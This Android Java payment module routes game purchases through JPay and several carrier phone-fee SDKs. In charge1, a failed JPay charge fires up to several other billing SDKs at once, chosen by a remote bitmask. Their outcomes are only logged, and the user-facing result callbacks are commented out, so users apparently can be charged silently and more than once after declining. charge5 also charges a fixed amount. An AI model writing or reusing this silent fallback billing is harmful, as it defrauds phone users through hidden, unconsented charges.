package com.bb_sz.pay;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.Log;


import com.android.mai.mtools.listener.MPayResultListener;
import com.android.mai.mtools.utils.MPay;
import com.android.pri.in.PriCallBack;
import com.ast.sdk.inter.PayCallBack;
import com.bb_sz.ndk.upload.ThirdPayCB;
import com.bb_sz.pay.order.PayOrder;
import com.jpay.sdk.IChargeResult;
import com.jpay.sdk.JPay;
import com.mj.jar.pay.BillingListener;
import com.mn.kt.MnPro;
import com.pay.sdk.register.onResultListener;
import com.wyzf.constant.PayResult;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import a.a.b.n.ESDK;
/**
 * Created by Administrator on 2017/7/3.
 */

public class PayFromEverySDK {


    static int payType = 9;
    static IChargeResult chargeResult = null;
    public static List<PayPoint> payPointList;



    public static Handler appHandler = new Handler(){

        @Override
        public void handleMessage(Message msg) {
            // TODO Auto-generated method stub
            if (msg.what == 100)
            {
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay success telephone pay----errCode"+errcode+"---extData="+extdata);
                //chargeResult.onChargeResult(0,"qi pa phone fee pay success");
            }
            else
            {
                //应用可以不关心这些错误码
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay failed----errCode"+errcode+"---extData="+extdata);
                //chargeResult.onChargeResult(1,"qi pa pay failed");
            }
        }

    };

    /**
     * 玉峰支付回调
     */
    public static BillingListener billingListener = new BillingListener() {
        @Override
        public void onInitResult(int i) {
            Log.e("sky","Yu Feng init result="+i);
        }

        @Override
        public void onBillingResult(int i, Bundle bundle) {
            Log.e("sky","Yu Feng pay result="+i);
        }
    };



    /**
     * 从配置文件中读取计费点
     * @param context
     */
    public static void SET_PAY_POINT(Context context){
        payPointList = new ArrayList<>();
        try {
            InputStreamReader reader = new InputStreamReader(context.getAssets().open("pay_point.txt"));
            BufferedReader bufferedReader = new BufferedReader(reader);
            String payPointStr = null;
            bufferedReader.readLine();
            while (null!=(payPointStr = bufferedReader.readLine())){
                if (TextUtils.isEmpty(payPointStr)){
                    continue;
                }
                String payPoints[] = payPointStr.split("\\|");
                PayPoint payPoint = new PayPoint();
                payPoint.setFeeName(payPoints[0]);
                payPoint.setMaiPayPoint(payPoints[1]);
                payPoint.setYiMeiPayPoint(payPoints[2]);
                payPoint.setQiPaPayPoint(payPoints[3]);
                payPoint.setYuFengPayPoint(payPoints[4]);
                payPoint.setLeLingPayPoint(payPoints[5]);
                payPointList.add(payPoint);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        for (PayPoint p:payPointList){
            Log.e("sky","payPoint = "+p.toString());
        }
    }


    private static String GET_M_PAY_POINT(String feeName) {
        for (int i=0;i<payPointList.size();i++){
            PayPoint payPoint = payPointList.get(i);
            if (payPoint.getFeeName().equals(feeName)){
                Log.e("sky","GET_M_PAY_POINT---feeName="+feeName+"payPoint="+payPoint.getMaiPayPoint());
                return payPoint.getMaiPayPoint();
            }
        }
        return payPointList.get(0).getMaiPayPoint();
    }

    private static int GET_YING_MEI_PAY_POINT(String feeName) {
        for (int i=0;i<payPointList.size();i++){
            PayPoint payPoint = payPointList.get(i);
            if (payPoint.getFeeName().equals(feeName)){
                Log.e("sky","GET_YING_MEI_PAY_POINT---feeName="+feeName+"payPoint="+payPoint.getYiMeiPayPoint());
                return Integer.parseInt(payPoint.getYiMeiPayPoint());
            }
        }
        return Integer.parseInt(payPointList.get(0).getYiMeiPayPoint());
    }

    private static String GET_QIPA_PAY_POINT(String feeName) {
        for (int i=0;i<payPointList.size();i++){
            PayPoint payPoint = payPointList.get(i);
            if (payPoint.getFeeName().equals(feeName)){
                Log.e("sky","getQiPaPayPoint---feeName="+feeName+"payPoint="+payPoint.getQiPaPayPoint());
                return payPoint.getQiPaPayPoint();
            }
        }
        return payPointList.get(0).getQiPaPayPoint();
    }

    private static String GET_YUFENG_PAY_POINT(String feeName) {
        for (int i=0;i<payPointList.size();i++){
            PayPoint payPoint = payPointList.get(i);
            if (payPoint.getFeeName().equals(feeName)){
                Log.e("sky","getYuFengPayPoint---feeName="+feeName+"payPoint="+payPoint.getYuFengPayPoint());
                return payPoint.getYuFengPayPoint();
            }
        }
        return payPointList.get(0).getYuFengPayPoint();
    }

    private static String GET_LELING_PAY_POINT(String feeName) {
        for (int i=0;i<payPointList.size();i++){
            PayPoint payPoint = payPointList.get(i);
            if (payPoint.getFeeName().equals(feeName)){
                Log.e("sky","getLeLingPayPoint---feeName="+feeName+"payPoint="+payPoint.getLeLingPayPoint());
                return payPoint.getLeLingPayPoint();
            }
        }
        return payPointList.get(0).getLeLingPayPoint();
    }




    public static void charge(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        PayOrder.getInstance().init(activity);
        payType = Api.getPayType(activity);
        Log.e("sky", "payType=" + payType + "------");
        if(feeDesc.equals("天天捕鱼") && feeName.equals("至尊大礼包")){
            chargeResultCb.onChargeResult(0,"pay free");
            return;
        }
        if (payType == 9) {
            charge1(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        } else {
            charge2(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        }
    }

    private static void giftCallBack(int i,String msg,IChargeResult chargeResult){
        if (!Api.sendGift()){
            chargeResult.onChargeResult(i,msg);
        }
    }

    /**
     * 奇葩sdk
     * @param activity
     * @param price
     * @param uniqueid
     * @param cpserverparam
     * @param feeName
     * @param feeDesc
     * @param chargeResultCb
     */
    private static void charge4(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        initThirdReport(activity, 5);
        chargeResult = chargeResultCb;
        MnPro.getInstance().start(activity, GET_QIPA_PAY_POINT(feeName), "");
    }


    public static void charge1(final Activity activity, final String price, final String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        final int paysdk = Api.getPaySDK(activity);
        Log.e("sky","paysdk="+paysdk+"---price="+price+"--uniqueid="+uniqueid+"--cpserverparam="+cpserverparam+"---feeName="+feeName+"---feeDesc="+feeDesc);

        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "jpay result:" + i + "-----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    if ((paysdk%2) == 1){
                        initThirdReport(activity, 1);
                        final int p = changePrice(price);
                        Log.e("sky", "WYZFPay start price=" + p + "---feeCode=" + "{$feeCode$}");
                        WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                Log.e("sky", "WYZFPay Result=" + payResult.msg + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                                switch (payResult) {
                                    case SUCCESS: {
                                        break;
                                    }
                                    default: {
                                    }
                                }
                            }
                        });
                    }
                    if (((paysdk>>1)%2) ==1){
                        initThirdReport(activity, 2);
                        //int yentPayPoint = getPayPointBuYu(feeDesc, feeName);
                        int yentPayPoint = GET_YING_MEI_PAY_POINT(feeName);
                        Log.e("sky", "Yin Mei start ----yentPayPoint=" + yentPayPoint);
                        if (yentPayPoint != 0){
                            ESDK.getInstance(activity).pay(yentPayPoint, cpserverparam, activity, new PriCallBack() {
                                @Override
                                public void success(int i) {
                                    Log.e("sky", "Yin mei pay success---i="+i);
                                }
                                @Override
                                public void fail(int i) {
                                    Log.e("sky:", "YentPay failed， i= " + i);
                                }
                            });
                        }
                    }

                    if ((paysdk>>2)%2 == 1){
                        initThirdReport(activity, 3);
                        int mprice = changePriceForMPay(price);
                        //String mPoint = getMPayPointByFeeName(feeDesc, feeName);
                        String mPoint = GET_M_PAY_POINT(feeName);
                        Log.e("sky", "MPay start-----mprice=" + mprice + "---MAI_MSA=" + "{$MAI_MSA$}---" + "cid=" + "{$CID$}" + "----mPoint=" + mPoint);
                        MPay.getInstance().pay(activity, mPoint, "{$CID$}"+ SystemClock.currentThreadTimeMillis(), "{$CID$}", new MPayResultListener() {
                            @Override
                            public void callback(String s, int i, int i1, String s1) {
                                Log.e("sky","Mpay result:cpOid="+s+"---code="+i+"---detail="+i1+"---ext="+s1);
                            }
                        });
                    }

                    if ((paysdk>>3)%2 == 1){
                        //奇葩pay
                        charge4(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }
                    //宜游
                    //charge3(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    if ((paysdk>>4)%2 == 1){
                        //玉峰
                        charge5(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }
                    if ((paysdk>>5)%2 == 1){
                        //乐麟
                        charge6(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }
                    if ((paysdk>>6)%2 == 1){
                        //掌游漫悦
//                        charge7(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }
                    if ((paysdk>>7)%2 == 1){
                        //魔信
                        charge8(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }

                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                }
            }


        });
    }

    private static void charge8(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        Log.e("sky","Mo Xin pay start");
        initThirdReport(activity, 9);
        Main.billing.billing(activity, Integer.parseInt(price), new PayCallBack() {
            @Override
            public void result(String payId, int code, String cpparam) {
                String text = "购买道具【" + payId + "】,透传参数是【" + cpparam + "】,";
                switch (code) {
                    case PayCallBack.PAY_CODE_INIT_ERROR:
                        text += "失败，初始化未完成";
                        break;
                    case PayCallBack.PAY_CODE_NET_FAILED:
                        text += "失败，网络连接失败";
                        break;
                    case PayCallBack.PAY_CODE_PAYCODE_ERROR:
                        text += "失败，计费点输入错误";
                        break;
                    case PayCallBack.PAY_CODE_FAILED:
                        text += "失败";
                        break;
                    case PayCallBack.PAY_CODE_SUCCESS:
                        text += "成功";
                        break;
                }
                Log.e("sky","Mo Xin pay result = "+text);
            }
        });
    }

//    private static void charge7(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
//        Log.e("sky","ZYMY pay start");
//        initThirdReport(activity, 8);
//        new Fp().onPy(activity,false);
//    }

    private static void charge6(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        Log.e("sky","Le Ling pay start");
        initThirdReport(activity, 7);
        if (null != Main.leLingSDK){
            String mChid = GET_LELING_PAY_POINT(feeName);
            Main.leLingSDK.Pay(activity, mChid, new onResultListener() {
                @Override
                public void onPaySuccessed() {
                    Log.e("sky","Le Ling pay result success");
                }

                @Override
                public void onPayFailed(int i) {
                    Log.e("sky","Le Ling pay result failed---i="+i);
                }
            });
        }
    }


    private static void charge5(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        String payPoint = null;
        if (null == Main.mjPaySDK){
            Log.e("sky","Yu Feng no need");
            return;
        }else if (Integer.parseInt(price)>=2000){
            payPoint = GET_YUFENG_PAY_POINT(feeName);
            initThirdReport(activity, 6);
            Main.mjPaySDK.pay(String.valueOf(System.currentTimeMillis()),payPoint,"2000");
            return;
        }
        Log.e("sky","price blow 20");
    }

//    private static void charge3(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, final IChargeResult chargeResultCb) {
//        initThirdReport(activity, 4);
//        int payPoint =1;
//        payPoint = getYiYouPayPoint(feeDesc,feeName);
//        Log.e("sky","yi you pay start-----payPoint="+payPoint);
//        PaySDK.getInstance().startPay(activity, payPoint, 0, 0, new PayResultCallback() {
//            @Override
//            public void onPayCancel(int i) {
//                Log.e("sky","Yi You pay cancel"+"---i="+i);
//            }
//
//            @Override
//            public void onPayFailed(int i, String s, String s1) {
//                Log.e("sky","Yi You pay failed"+"------i="+i+"---s="+s+"---s1="+s1);
//            }
//
//            @Override
//            public void onPaySuccess(int i, int i1) {
//                Log.e("sky","Yi You pay success"+"---i="+i+"----i1="+i1);
//            }
//        });
//    }

    public static void charge2(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {


        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "i=" + i + "----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    final int p = changePrice(price);
                    Log.e("sky", "price=" + p);
                    if (Api.getPayType(activity) == 2) {
                        Log.e("sky", "WYZFPay first");
                        initThirdReport(activity, 1);
                        WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                switch (payResult) {
                                    case SUCCESS: {
                                        Log.e("sky:", "weiyun success");
                                        giftCallBack(0, "WYZFPay success",chargeResultCb);
                                        //chargeResultCb.onChargeResult(0, "WYZFPay success");
                                        break;
                                    }
                                    default: {
                                        Log.e("sky", "PayResult" + payResult.msg);
                                        initThirdReport(activity, 2);
                                        ESDK.getInstance(activity).pay(GET_YING_MEI_PAY_POINT(feeName), cpserverparam, activity, new PriCallBack() {
                                            @Override
                                            public void success(int i) {
                                                Log.e("sky:", "YentPay success");
                                                giftCallBack(0, "YentPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                            }

                                            @Override
                                            public void fail(int i) {
                                                Log.e("sky:", "YentPay failed， i= " + i);
                                                giftCallBack(1, "pay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        });
                                    }
                                }
                            }
                        });
                    } else {
                        Log.e("sky", "Yent first");
                        initThirdReport(activity, 2);
                        ESDK.getInstance(activity).pay(GET_YING_MEI_PAY_POINT(feeName), feeName, activity, new PriCallBack() {
                            @Override
                            public void success(int i) {
                                Log.e("sky:", "YentPay success");
                                giftCallBack(0, "YentPay success",chargeResultCb);
                                //chargeResultCb.onChargeResult(0, "YentPay success");
                            }

                            @Override
                            public void fail(int i) {
                                Log.e("sky:", "YentPay failed， i= " + i);
                                initThirdReport(activity, 1);
                                WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                                    @Override
                                    public void onResult(PayResult payResult, int i) {
                                        switch (payResult) {
                                            case SUCCESS: {
                                                Log.e("sky:", "WYZFPay success");
                                                giftCallBack(0, "WYZFPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                                break;
                                            }
                                            default: {
                                                Log.e("sky", "PayResult" + payResult.msg);
                                                Log.e("sky:", "WYZFPay failed");
                                                giftCallBack(1, "WYZFPay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        }
                                    }
                                });
                            }
                        });
                    }
                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                    //chargeResultCb.onChargeResult(0, "jpay success");
                }
            }
        });
    }

    private static int changePrice(String price) {
        int p = Integer.parseInt(price);
        if (p < 1000) {
            return 500;
        } else if (p < 1500) {
            return 1000;
        } else if (p < 2000) {
            return 1500;
        }
        return 2000;
    }

    private static int changePriceForMPay(String price) {
        int p = Integer.parseInt(price);
        if (p % 200 != 0) {
            return p - 100;
        } else {
            return p;
        }
    }

    private static void initThirdReport(Activity activity, int type) {
        ThirdPayCB.getInstance().init(activity, type);
    }

}
